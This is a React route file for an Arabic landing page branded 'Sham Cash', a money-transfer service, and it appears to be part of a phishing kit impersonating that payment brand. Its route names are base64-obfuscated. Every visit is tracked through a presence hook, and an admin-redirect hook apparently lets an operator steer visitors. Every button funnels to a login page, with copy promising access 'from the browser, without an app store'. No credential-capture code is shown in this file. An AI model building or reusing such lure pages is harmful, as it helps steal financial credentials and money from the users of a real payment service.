import { createFileRoute, Link } from "@tanstack/react-router";
import {
  ShieldCheck,
  Zap,
  Headset,
  ArrowLeftRight,
  Gauge,
  MousePointerClick,
  LockKeyhole,
  BadgePercent,
  LayoutGrid,
  ArrowLeft,
  Menu,
  X,
} from "lucide-react";
import { useState } from "react";
import shamLogo from "@/assets/sham-login-logo.webp";
import { usePresenceTracker } from "@/lib/presence";
import { useAdminRedirect } from "@/lib/admin-redirect";
import { useReveal } from "@/lib/use-reveal";
import { Button } from "@/components/ui/button";

const TITLE = "شام كاش | الصفحة الرئيسية — إدارة معاملاتك المالية بسهولة وأمان";
const DESCRIPTION =
  "شام كاش: الحل الأمثل لإدارة معاملاتك المالية — إرسال واستلام الأموال بسرعة وسلاسة، بأعلى معايير الأمان وبدون رسوم خفية.";

export const Route = createFileRoute("/aG9tZQ")({
  head: () => ({
    meta: [
      { title: TITLE },
      { name: "description", content: DESCRIPTION },
      { property: "og:title", content: TITLE },
      { property: "og:description", content: DESCRIPTION },
      { property: "og:type", content: "website" },
      { property: "og:site_name", content: "شام كاش" },
      { property: "og:locale", content: "ar_SY" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "twitter:title", content: TITLE },
      { name: "twitter:description", content: DESCRIPTION },
    ],
  }),
  component: HomePage,
});

const NAV = [
  { href: "#top", label: "الرئيسية" },
  { href: "#features", label: "المزايا" },
  { href: "#services", label: "الخدمات" },
  { href: "#contact", label: "تواصل معنا" },
];

const WHY = [
  {
    icon: Headset,
    title: "الدعم",
    text: "فريق الدعم الخاص بنا متواجد على مدار الساعة للرد على استفساراتك وحل أي مشاكل قد تواجهها، لضمان تجربة استخدام سلسة وخالية من العقبات.",
  },
  {
    icon: ShieldCheck,
    title: "الأمان",
    text: "تطبيقنا مصمم بأعلى معايير الأمان لحماية بياناتك ومعاملاتك المالية، مما يضمن لك تجربة موثوقة وآمنة في كل خطوة.",
  },
  {
    icon: Zap,
    title: "السرعة",
    text: "تطبيقنا يتميز بالسرعة العالية لتنفيذ العمليات، مما يضمن تجربة فورية وسلسة تلبي احتياجاتك في أي وقت.",
  },
];

const FEATURES = [
  { icon: ArrowLeftRight, title: "سهولة التحويل بين المستخدمين", text: "أرسل واستقبل الأموال بسهولة وسلاسة بين مستخدمي التطبيق." },
  { icon: Gauge, title: "سرعة العمليات", text: "نفّذ معاملاتك المالية بسرعة فائقة دون أي تأخير." },
  { icon: MousePointerClick, title: "سهولة الاستخدام", text: "واجهة تطبيق بسيطة ومباشرة تسهل عليك إجراء العمليات دون تعقيد." },
  { icon: LockKeyhole, title: "أمان الأموال", text: "نضمن حماية كاملة لأموالك ومعاملاتك باستخدام أحدث تقنيات الأمان." },
  { icon: BadgePercent, title: "بدون رسوم", text: "استمتع بخدماتنا المالية بدون أي رسوم خفية، لتبقى كل معاملاتك واضحة وشفافة." },
  { icon: LayoutGrid, title: "الخدمات", text: "نوفر مجموعة من الخدمات المتنوعة التي تلبي احتياجاتك اليومية وتوفر عليك الوقت والجهد." },
];

function HomePage() {
  usePresenceTracker({ page: "/aG9tZQ" });
  useAdminRedirect();
  useReveal();
  const [menuOpen, setMenuOpen] = useState(false);

  return (
    <main dir="rtl" lang="ar" id="top" className="relative min-h-dvh bg-background text-foreground tracking-normal [&_h1]:tracking-normal [&_h2]:tracking-normal [&_h3]:tracking-normal">
      {/* ترويسة */}
      <header className="sticky top-0 z-40 border-b border-border/50 bg-background/80 backdrop-blur-md">
        <div className="mx-auto flex h-16 w-full max-w-5xl items-center justify-between px-4">
          <a href="#top" className="flex items-center gap-2">
            <img src={shamLogo} alt="شام كاش" width={36} height={36} className="size-9 rounded-xl object-contain" />
            <span className="text-lg font-black text-foreground">شام كاش</span>
          </a>

          <nav className="hidden items-center gap-6 md:flex" aria-label="التنقل الرئيسي">
            {NAV.map((item) => (
              <a
                key={item.href}
                href={item.href}
                className="text-sm font-semibold text-muted-foreground transition-colors hover:text-foreground"
              >
                {item.label}
              </a>
            ))}
          </nav>

          <div className="flex items-center gap-2">
            <Button asChild variant="outline" className="hidden min-h-11 border-primary/60 px-5 font-bold md:inline-flex">
            <Link
              to="/YXV0aA"
            >
              تسجيل الدخول
            </Link>
            </Button>
            <Button
              type="button"
              variant="outline"
              size="icon"
              onClick={() => setMenuOpen((v) => !v)}
              aria-label={menuOpen ? "إغلاق القائمة" : "فتح القائمة"}
              aria-expanded={menuOpen}
              aria-controls="home-mobile-menu"
              onKeyDown={(event) => { if (event.key === "Escape") setMenuOpen(false); }}
              className="size-11 border-border/60 md:hidden"
            >
              {menuOpen ? <X className="size-5" aria-hidden /> : <Menu className="size-5" aria-hidden />}
            </Button>
          </div>
        </div>

        {menuOpen ? (
          <nav id="home-mobile-menu" className="border-t border-border/50 bg-background px-4 py-3 md:hidden" aria-label="قائمة الجوال">
            <div className="grid gap-1">
              {NAV.map((item) => (
                <a
                  key={item.href}
                  href={item.href}
                  onClick={() => setMenuOpen(false)}
                  className="flex min-h-11 items-center rounded-lg px-3 text-sm font-semibold text-muted-foreground transition-colors hover:bg-secondary hover:text-foreground"
                >
                  {item.label}
                </a>
              ))}
              <Button asChild className="mt-2 min-h-12 font-bold">
              <Link
                to="/YXV0aA"
                onClick={() => setMenuOpen(false)}
              >
                تسجيل الدخول
              </Link>
              </Button>
            </div>
          </nav>
        ) : null}
      </header>

      {/* البطل */}
      <section className="relative overflow-hidden">
        <div className="mx-auto flex w-full max-w-3xl flex-col items-center px-5 pb-10 pt-14 text-center sm:pb-16 sm:pt-20">
          <img src={shamLogo} alt="" width={64} height={64} fetchPriority="high" className="size-16 object-contain sm:size-20" />
          <h1 className="mt-4 text-4xl font-black leading-tight text-foreground sm:text-5xl">
            شام كاش
          </h1>
          <p className="mt-3 text-lg font-bold text-accent">معاملاتك المالية بسهولة وأمان</p>
          <p className="mt-4 max-w-[52ch] text-pretty text-base leading-8 text-muted-foreground">
            نسعى لتوفير منصة موثوقة وآمنة تتيح للمستخدمين إجراء المعاملات المالية بسهولة ومرونة. هدفنا هو تمكين
            الأفراد من إدارة شؤونهم المالية بكفاءة وشفافية.
          </p>
          <Button asChild size="lg" className="mt-6 min-h-13 w-full max-w-sm font-bold text-base sm:w-auto sm:px-12">
          <Link
            to="/YXV0aA"
          >
            تسجيل الدخول
            <ArrowLeft className="size-4 shrink-0" aria-hidden />
          </Link>
          </Button>
        </div>
      </section>

      {/* حول */}
      <section className="mx-auto w-full max-w-3xl px-4 pb-12 sm:pb-16">
        <div className="border-t border-border/60 pt-8 text-center sm:pt-10" data-reveal="">
          <h2 className="text-2xl font-black text-foreground">حول شام كاش</h2>
          <span className="mx-auto mt-3 block h-0.5 w-12 rounded-full bg-accent" aria-hidden />
          <p className="mt-5 text-right text-base leading-8 text-muted-foreground sm:text-center">
            تطبيقنا هو الحل الأمثل لإدارة معاملاتك المالية بسهولة وأمان يتيح لك إرسال واستلام الأموال بسرعة وسلاسة،
            مع واجهة استخدام بسيطة وتجربة مريحة نسعى من خلاله إلى تقديم خدمات مالية مبتكرة تضمن الشفافية والموثوقية،
            مما يتيح لك التحكم الكامل بأموالك في أي وقت ومن أي مكان.
          </p>
        </div>
      </section>

      {/* لماذا شام كاش */}
      <section className="mx-auto w-full max-w-5xl px-4 pb-12 sm:pb-16">
        <h2 className="text-center text-2xl font-black text-foreground">لماذا شام كاش</h2>
        <span className="mx-auto mt-3 block h-0.5 w-12 rounded-full bg-accent" aria-hidden />
        <div className="mt-8 grid gap-4 sm:grid-cols-3">
          {WHY.map((item) => (
            <article
              key={item.title}
              data-reveal=""
              className="flex items-start gap-4 rounded-lg border border-border/60 bg-card p-5 text-right transition-colors hover:border-accent/40 sm:block sm:p-6 sm:text-center"
            >
              <span className="flex size-11 shrink-0 items-center justify-center rounded-lg bg-accent/15 text-accent sm:mx-auto">
                <item.icon className="size-6" aria-hidden />
              </span>
              <div className="min-w-0">
                <h3 className="text-lg font-black text-foreground sm:mt-4">{item.title}</h3>
                <p className="mt-2 text-[15px] leading-7 text-muted-foreground">{item.text}</p>
              </div>
            </article>
          ))}
        </div>
      </section>

      {/* المزايا */}
      <section id="features" className="mx-auto w-full max-w-5xl scroll-mt-20 px-4 pb-12 sm:pb-16">
        <h2 className="text-center text-2xl font-black text-foreground">المزايا</h2>
        <span className="mx-auto mt-3 block h-0.5 w-12 rounded-full bg-accent" aria-hidden />
        <p className="mx-auto mt-5 max-w-[60ch] text-center text-[15px] leading-8 text-muted-foreground">
          يقدم تطبيقنا مجموعة من المزايا المصممة لتلبية احتياجاتك بكل احترافية، منها السرعة في تنفيذ العمليات،
          السهولة في الاستخدام، أعلى مستويات الأمان، وخدمات بدون رسوم خفية.
        </p>
        <div className="mt-8 grid gap-4 sm:grid-cols-2 lg:grid-cols-3">
          {FEATURES.map((item) => (
            <article
              key={item.title}
              data-reveal=""
              className="flex items-start gap-4 rounded-lg border border-border/60 bg-card p-5 transition-colors hover:border-accent/40 sm:block sm:p-6"
            >
              <span className="flex size-11 shrink-0 items-center justify-center rounded-lg bg-accent/15 text-accent">
                <item.icon className="size-5" aria-hidden />
              </span>
              <div className="min-w-0">
                <h3 className="text-base font-black text-foreground sm:mt-4">{item.title}</h3>
                <p className="mt-1.5 text-[15px] leading-7 text-muted-foreground sm:mt-2">{item.text}</p>
              </div>
            </article>
          ))}
        </div>
      </section>

      {/* الخدمات / دعوة أخيرة */}
      <section id="services" className="mx-auto w-full max-w-3xl scroll-mt-20 px-4 pb-12 sm:pb-16">
        <div className="border-y border-primary/40 py-8 text-center sm:py-10" data-reveal="">
          <h2 className="text-2xl font-black text-foreground">جاهز للبدء؟</h2>
          <p className="mt-4 text-[15px] leading-8 text-muted-foreground">
            سجّل دخولك الآن واستمتع بكل خدمات شام كاش مباشرة من المتصفح — بدون متجر تطبيقات.
          </p>
          <Button asChild size="lg" className="mt-6 min-h-13 w-full max-w-sm text-base font-bold sm:w-auto">
          <Link
            to="/YXV0aA"
          >
            تسجيل الدخول الآن
            <ArrowLeft className="size-4 shrink-0" aria-hidden />
          </Link>
          </Button>
        </div>
      </section>

      {/* تواصل معنا */}
      <section id="contact" className="mx-auto w-full max-w-3xl scroll-mt-20 px-4 pb-16 sm:pb-20">
        <div className="pt-4 text-center sm:pt-8" data-reveal="">
          <h2 className="text-2xl font-black text-foreground">تواصل معنا</h2>
          <span className="mx-auto mt-3 block h-0.5 w-12 rounded-full bg-accent" aria-hidden />
          <p className="mt-6 text-[15px] leading-8 text-muted-foreground">
            إذا كان لديك أي استفسار أو ملاحظة، لا تتردد في التواصل معنا. فريق الدعم متواجد دائماً لمساعدتك.
          </p>
        </div>
      </section>

      <footer className="border-t border-border/50 py-6 text-center text-xs font-semibold text-muted-foreground">
        شام كاش — معاملاتك المالية بسهولة وأمان
      </footer>
    </main>
  );
}
